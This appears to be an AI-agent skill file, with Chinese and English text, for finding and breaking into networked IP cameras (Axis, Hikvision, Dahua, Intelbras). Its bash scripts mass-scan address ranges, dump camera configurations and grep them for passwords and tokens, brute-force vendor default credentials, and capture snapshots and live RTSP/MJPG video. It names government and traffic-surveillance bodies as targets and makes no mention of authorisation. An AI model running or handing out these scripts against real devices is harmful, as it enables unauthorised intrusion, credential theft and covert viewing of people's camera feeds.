---
name: iot-camera-recon
description: 当 554 端口开放时，通过 RTSP、ONVIF、Axis 配置攻击摄像头。
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
metadata:
  tags: [recon, camera, IoT, RTSP, ONVIF, Axis, Hikvision]
  category: recon
  related_skills:
    - port-mass-scan
    - port-service-discovery
---

# IoT 摄像头侦察技能

IP 摄像头评估，覆盖 RTSP 暴露、厂商配置端点、
ONVIF 服务枚举、认证控制与固件
识别。

## When to Use

- `port-mass-scan` 发现 RTSP（554）或摄像头 HTTP 端口（80、8010、8011）。
- 目标是实体安防公司、交通管理或政府监控机构。
- Shodan 搜索显示目标 IP 段内存在摄像头设备。
- 在 `port-service-discovery` 发现 Axis/Hikvision/Dahua 的 ONVIF 服务之后。

## Prerequisites

- 具备 curl、python3 的 `terminal`。
- 批量扫描需要：masscan 或 RustScan（参见 `port-mass-scan`）。
- 验证码流需要 VLC 或 ffmpeg（可选）。

## How to Run

```bash
# Quick camera detection on known IP
curl -sk --max-time 5 --connect-timeout 5 "http://IP:8010/axis-cgi/jpg/image.cgi" -o snapshot.jpg
curl -sk --max-time 5 --connect-timeout 5 "http://IP:8010/axis-cgi/admin/param.cgi?action=list" | head -50

# Mass RTSP discovery on a /24
masscan -p554,80,8010,8011 --rate=10000 192.168.0.0/24 -oJ cameras.json
```

## 快速参考

| 摄像头品牌 | 默认 HTTP 端口 | 快照 URL | 配置 URL | 默认凭据 |
|-------------|-------------------|-------------|------------|---------------|
| Axis | 80, 8010 | `/axis-cgi/jpg/image.cgi` | `/axis-cgi/admin/param.cgi?action=list` | root:pass, root:admin |
| Hikvision | 80, 554 | `/ISAPI/Streaming/channels/101/picture` | `/System/configurationFile?auth=...` | admin:12345, admin:admin |
| Dahua | 80, 554 | `/cgi-bin/snapshot.cgi` | `/cgi-bin/configManager.cgi?action=getConfig` | admin:admin, admin:password |
| Intelbras | 80 | `/cgi-bin/snapshot.cgi` | `/web/cgi-bin/hi3510/param.cgi` | admin:admin, admin:123456 |
| ONVIF | 80, 8899 | 不适用（SOAP） | `/onvif/device_service` | admin:admin |

## Procedure

### 阶段 1 — 摄像头批量发现

```bash
RANGE="$1"  # e.g., 187.44.0.0/16
OUTDIR="$OUTDIR/cameras"
mkdir -p "$OUTDIR"

echo "[*] Camera hunt on $RANGE"

# Masscan for RTSP + camera HTTP ports
masscan -p554,80,8010,8011,8899 --rate=50000 "$RANGE" -oJ "$OUTDIR/masscan_cameras.json"

# Extract IPs with open camera ports
HITS=$(python3 -c "
import json
with open('$OUTDIR/masscan_cameras.json') as f:
    ips = set()
    for line in f:
        try:
            data = json.loads(line.strip()) if line.strip() else {}
            ips.add(data.get('ip', ''))
        except: pass
    for ip in sorted(ips):
        print(ip)
" 2>/dev/null)

echo "[+] $(echo "$HITS" | wc -l) IPs with camera ports"

# Probe each with curl
echo "$HITS" | while read ip; do
  echo "--- $ip ---"

  # Axis snapshot
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 --connect-timeout 3 "http://$ip:8010/axis-cgi/jpg/image.cgi")
  [[ "$code" == "200" ]] && echo "  [AXIS] Snapshot: http://$ip:8010/axis-cgi/jpg/image.cgi"

  # Axis config dump
  config=$(curl -sk --max-time 5 --connect-timeout 5 "http://$ip:8010/axis-cgi/admin/param.cgi?action=list" 2>/dev/null)
  if [[ -n "$config" ]] && echo "$config" | grep -q "root.Brand"; then
    BRAND=$(echo "$config" | grep "root.Brand.Brand=" | cut -d= -f2 | tr -d '"')
    MODEL=$(echo "$config" | grep "root.Brand.ProdShortName=" | cut -d= -f2 | tr -d '"')
    FIRMWARE=$(echo "$config" | grep "root.Properties.Firmware.Version=" | cut -d= -f2 | tr -d '"')
    SERIAL=$(echo "$config" | grep "root.Properties.System.SerialNumber=" | cut -d= -f2 | tr -d '"')
    echo "  [CONFIG] $BRAND $MODEL — Firmware: $FIRMWARE — Serial: $SERIAL"
    echo "$config" | wc -l | xargs echo "  Parameters:"
  fi

  # Generic RTSP
  for port in 554 8554; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 --connect-timeout 3 "http://$ip:$port/")
    [[ "$code" != "000" ]] && echo "  [RTSP] Port $port responds (HTTP $code)"
  done

  # ONVIF discovery (port 8899 or 80)
  for port in 8899 80; do
    resp=$(curl -sk --max-time 5 --connect-timeout 5 -X POST "http://$ip:$port/onvif/device_service" \
      -H "Content-Type: application/soap+xml" \
      -d '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body><GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/></s:Body></s:Envelope>' 2>/dev/null)
    if echo "$resp" | grep -qi "manufacturer\|model\|serial"; then
      echo "  [ONVIF] Device info available on port $port"
    fi
  done
done
```

### 阶段 2 — Axis 摄像头完整利用

```bash
IP="$1"

echo "[*] Axis camera exploitation on $IP"

# 1. Snapshot
curl -sk --max-time 5 --connect-timeout 5 "http://$IP:8010/axis-cgi/jpg/image.cgi" -o "axis_${IP//./_}_snapshot.jpg"
echo "[+] Snapshot saved"

# 2. Full config dump (988 parameters on Axis P1378-LE)
curl -sk --max-time 10 --connect-timeout 10 "http://$IP:8010/axis-cgi/admin/param.cgi?action=list" -o "axis_${IP//./_}_config.txt"
PARAM_COUNT=$(wc -l < "axis_${IP//./_}_config.txt")
echo "[+] Config dump: $PARAM_COUNT parameters"

# 3. Extract sensitive parameters
echo "[*] Sensitive parameters:"
grep -iE 'password|user|token|key|serial|license|cert|network\.eth0\.IP' "axis_${IP//./_}_config.txt" | head -20

# 4. MJPG video stream
curl -sk --max-time 5 --connect-timeout 5 "http://$IP:8010/axis-cgi/mjpg/video.cgi" -o "axis_${IP//./_}_stream.mjpg" &
sleep 3; kill %1 2>/dev/null
STREAM_SIZE=$(stat -c%s "axis_${IP//./_}_stream.mjpg" 2>/dev/null || echo 0)
[[ "$STREAM_SIZE" -gt 1000 ]] && echo "[+] Live MJPG stream captured (${STREAM_SIZE} bytes)"

# 5. List available services
for svc in "admin" "viewer" "operator" "ptz" "applications" "local"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 --connect-timeout 3 "http://$IP:8010/axis-cgi/$svc/")
  [[ "$code" != "404" && "$code" != "000" ]] && echo "  Service: /axis-cgi/$svc/ (HTTP $code)"
done
```

### 阶段 3 — 默认凭据测试

```bash
IP="$1"
BRAND="${2:-axis}"  # axis, hikvision, dahua, intelbras

echo "[*] Default credential test on $IP ($BRAND)"

# Brand-specific default credentials
case "$BRAND" in
  axis)
    CREDS=("root:pass" "root:admin" "root:root" "root:12345" "admin:admin" "admin:12345")
    AUTH_URL="http://$IP:8010/axis-cgi/admin/param.cgi?action=list"
    ;;
  hikvision)
    CREDS=("admin:12345" "admin:admin" "admin:123456" "admin:password")
    AUTH_URL="http://$IP/ISAPI/System/deviceInfo"
    ;;
  dahua)
    CREDS=("admin:admin" "admin:password" "admin:123456" "admin:admin123")
    AUTH_URL="http://$IP/cgi-bin/snapshot.cgi"
    ;;
  intelbras)
    CREDS=("admin:admin" "admin:123456" "admin:password" "admin:admin123")
    AUTH_URL="http://$IP/cgi-bin/snapshot.cgi"
    ;;
  *)
    CREDS=("admin:admin" "admin:12345" "root:admin" "admin:password")
    AUTH_URL="http://$IP/"
    ;;
esac

for cred in "${CREDS[@]}"; do
  USER="${cred%%:*}"
  PASS="${cred##*:}"
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 \
    -u "$USER:$PASS" "$AUTH_URL" 2>/dev/null)

  if [[ "$code" == "200" ]]; then
    echo "  [CRITICAL] DEFAULT CREDENTIALS: $cred"
  elif [[ "$code" == "401" ]]; then
    echo "  [-] $cred (auth failed)"
  else
    echo "  [$code] $cred"
  fi
done
```

### 阶段 4 — RTSP 码流访问

```bash
IP="$1"
PORT="${2:-554}"

echo "[*] RTSP stream access on $IP:$PORT"

# Common RTSP paths
STREAMS=(
  "/live" "/stream" "/cam/realmonitor"
  "/h264" "/h264/ch1/main/av_stream"
  "/Streaming/Channels/101" "/ISAPI/Streaming/channels/101"
  "/axis-media/media.amp" "/onvif1" "/onvif2"
)

for stream in "${STREAMS[@]}"; do
  RTSP_URL="rtsp://$IP:$PORT$stream"
  echo -n "  $stream: "

  # Test with ffmpeg (2 second probe)
  timeout 3 ffprobe -v quiet -rtsp_transport tcp "$RTSP_URL" 2>/dev/null
  if [[ $? -eq 0 ]]; then
    echo "LIVE STREAM"
  else
    echo "no response"
  fi
done

# Try with default credentials
for cred in "admin:admin" "admin:12345" "root:pass"; do
  RTSP_URL="rtsp://${cred}@$IP:$PORT/live"
  timeout 3 ffprobe -v quiet -rtsp_transport tcp "$RTSP_URL" 2>/dev/null
  [[ $? -eq 0 ]] && echo "  [CRITICAL] RTSP stream accessible with $cred"
done
```

## Pitfalls

- **CGNAT 会阻断对摄像头的直接访问。** 许多摄像头位于运营商级 NAT 之后，从互联网无法访问。
- **基于 UDP 的 RTSP 不可靠。** 码流测试请使用 `-rtsp_transport tcp` 以保证可靠性。
- **配置转储可能非常大。** Axis 配置为 50-200KB。使用 `--max-time` 避免在慢速连接上挂起。
- **视频码流带宽开销大。** 先用快照测试，再做短时码流探测。
- **摄像头固件很少更新。** 2026 年扫描到 2020 年的固件很常见 —— 不要假设已打补丁。

## Verification

- 快照 URL 必须返回有效的 JPEG 图像（用 `file` 命令检查）。
- 配置转储必须包含摄像头专属参数（品牌、型号、序列号、固件版本）。
- RTSP 码流必须能产出视频帧（用 ffprobe 或 VLC 验证）。
- 默认凭据必须能访问受保护端点（带认证返回 HTTP 200，不带认证返回 401）。
- 所有暴露的参数都必须记录：品牌、型号、序列号、固件版本、网络配置、发现的凭据。
